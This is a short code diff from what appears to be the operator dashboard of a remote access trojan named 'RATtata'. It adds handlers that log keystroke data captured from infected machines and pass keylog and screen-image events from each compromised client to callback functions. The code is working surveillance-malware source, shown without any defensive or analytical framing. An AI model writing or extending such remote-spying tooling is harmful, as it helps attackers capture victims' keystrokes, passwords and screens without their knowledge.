@@ -124,10 +124,22 @@ export default {
       });
 
       client.on("keylog", keylogData => {
+        console.log(keylogData);
         this.$store.dispatch("addKeylog", {
           serverID: client.__serverID,
           data: keylogData
         });
+        let callbackEvents = window.RATtata.callbackEvents[client.__serverID];
+        if (callbackEvents && callbackEvents.keylog) {
+          callbackEvents.keylog(keylogData);
+        }
+      });
+
+      client.on("display", imageBuffer => {
+        let callbackEvents = window.RATtata.callbackEvents[client.__serverID];
+        if (callbackEvents && callbackEvents.display) {
+          callbackEvents.display(imageBuffer);
+        }
       });
 
       client.on("serverID", id => {
